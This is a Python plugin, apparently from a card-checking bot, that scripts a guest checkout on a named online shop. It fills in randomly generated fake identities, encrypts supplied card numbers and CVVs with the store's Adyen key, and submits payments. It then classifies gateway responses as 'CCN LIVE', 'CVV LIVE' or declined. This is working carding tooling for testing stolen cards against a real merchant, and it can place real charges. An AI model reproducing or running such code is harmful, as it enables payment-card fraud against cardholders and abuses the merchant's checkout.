import random
import requests
import urllib
import base64
from py_adyen_encrypt import encryptor

from .userinfo import RandUser
from mills.plugins._helpers.tools import find_between

def adyen_enc(cc, mes, ano, cvv, ADYEN_KEY, adyen_version):
    enc = encryptor(ADYEN_KEY)
    enc.adyen_version = adyen_version
    enc.adyen_public_key = ADYEN_KEY

    card = enc.encrypt_card(card=cc, cvv=cvv, month=mes, year=ano)
    month = card['month']
    year = card['year']
    cvv = card['cvv']
    card = card['card']

    # card = urllib.parse.quote_plus(card)
    # Month = urllib.parse.quote_plus(month)
    # Year = urllib.parse.quote_plus(year)
    # cvv = urllib.parse.quote_plus(cvv)
    return card, month, year,cvv



def at_def(r,cc, mes, ano, cvv):
    rand_user = RandUser().rand_user()
    a = r.get('https://www.beneoshop.com/hot-air-popcorn-maker-moviestar.html')
    form_key = find_between(a.text, 'form_key" type="hidden" value="','"')
    if not (form_key,a):
        return "First Request Error" "❌", 'DECLINED' 
    b_data = {
'product': '178',
'selected_configurable_option': '',
'related_product': '',
'item': '178',
'form_key': form_key,
'product_page': 'true',
'qty': '1',
}
    b = r.post('https://www.beneoshop.com/amasty_cart/cart/add/', b_data, headers = {'x-requested-with': 'XMLHttpRequest'})

    if not b:
        return "Second Request Error" "❌", 'DECLINED' 


    c = r.get('https://www.beneoshop.com/checkout/')
    entity_id = find_between(c.text, 'entity_id":"','"')
    if not (c, entity_id):
        return "Third Request Error" "❌", 'DECLINED' 
    link = f'https://www.beneoshop.com/rest/en/V1/guest-carts/{entity_id}/'
    
    d_data = {
    "addressInformation": {
        "shipping_address": {
            "countryId": "FR",
            "regionCode": "",
            "region": "",
            "street": [
                "32 boulevard Albin Durand"
            ],
            "company": "",
            "telephone": rand_user['phone'],
            "postcode": "95800",
            "city": "Cergy",
            "firstname": rand_user['first_name'],
            "lastname": rand_user['last_name']
        },
        "billing_address": {
            "countryId": "FR",
            "regionCode": "",
            "region": "",
            "street": [
                "32 boulevard Albin Durand"
            ],
            "company": "",
            "telephone": rand_user['phone'],
            "postcode": "95800",
            "city": "Cergy",
            "firstname": rand_user['first_name'],
            "lastname": rand_user['last_name'],
            "saveInAddressBook": None
        },
        "shipping_method_code": "flexishipping",
        "shipping_carrier_code": "flexishipping",
        "extension_attributes": {
            "company_no": "",
            "tax_id": ""
        }
    }
}

    d = r.post(link + 'shipping-information', json = d_data)

    if not d :
        return "Fourth Request Error" "❌", 'DECLINED' 

    api_key = "10001|9700D30E59217002696EAE765F068E26A637DAAAFB41D52C0F284799A27086BDCBFA3F0A973BAD595D0CB36FCE7F85605F1E5CA29265F241A0CC1F2B445081C07E9E5ED5A478B296208E8F68F0FDA56CFDF048EF51FD2E36328D7B21F33D69A0D3DB6634A2E3FFE7C6470988C866C01A07E5B6F907DEFFA0D167F0D4732D4B63CA73747B0BFCAE1F6D3431B3C1BA9E8A6C95DCCA646A07B6F1830E555A7C82E19BF228C0CAE67E231C5E47C044415AF99D9997A60CB1E97EBE0E380CBEECA7D199FFE8AC0BB020EAC15769C05B5B2A7BBF1C6CFFA1E319EA8E72F26AD70F74DFE7464019FE93ABB481D4BA2F6FA4742E8AF09073CAE183B28D436C9E9F58604F"

    card,month,year,cvc = adyen_enc(cc,mes,ano,cvv, api_key, "_0_1_25")

    e_data = {
    "cartId": entity_id,
    "billingAddress": {
        "countryId": "FR",
        "regionCode": "",
        "region": "",
        "street": [
            "32 boulevard Albin Durand"
        ],
        "company": "",
        "telephone": "2258945987",
        "postcode": "95800",
        "city": "Cergy",
        "firstname": rand_user['first_name'],
        "lastname": rand_user['last_name'],
        "saveInAddressBook": None
    },
    "paymentMethod": {
        "method": "adyen_cc",
        "additional_data": {
            "guestEmail": rand_user['email'],
            "cc_type": "VISA" if cc.startswith("3") else "MC",
            "number": card,
            "cvc": cvc,
            "expiryMonth": month,
            "expiryYear":year,
            "holderName": rand_user['first_name'],
            "store_cc": False,
            "number_of_installments": "",
            "java_enabled": False,
            "screen_color_depth": 24,
            "screen_width": 1366,
            "screen_height": 768,
            "timezone_offset": -330,
            "language": "en-GB",
            "combo_card_type": "credit"
        },
        "extension_attributes": {
            "agreement_ids": [
                "6",
                "7"
            ]
        }
    },
    "email": rand_user['email']
}


    e = r.post(link + 'payment-information', json = e_data,headers = {'x-requested-with': 'XMLHttpRequest'})
    if e.status_code != 200:
        if 'message' in e.json():
            message = e.json()['message']
            if "CVC Declined" in message:
                r_text, r_logo, r_respo = "CVC DECLINED", "✅", 'CCN LIVE'
            elif "Not enough balance" in message:
                r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV LIVE'      
            elif "AVS Declined" in message:
                r_text, r_logo, r_respo = "AVS DECLINED", "✅", 'CVV LIVE'
            else:
                r_text, r_logo, r_respo = "DECLINED" , "❌", 'DECLINED'
            return r_text if not message else message,r_logo,r_respo
        else:
            return e.text, "❌", 'DECLINED' 
    else:
        return "Chaged $36", "✅", 'CVV LIVE'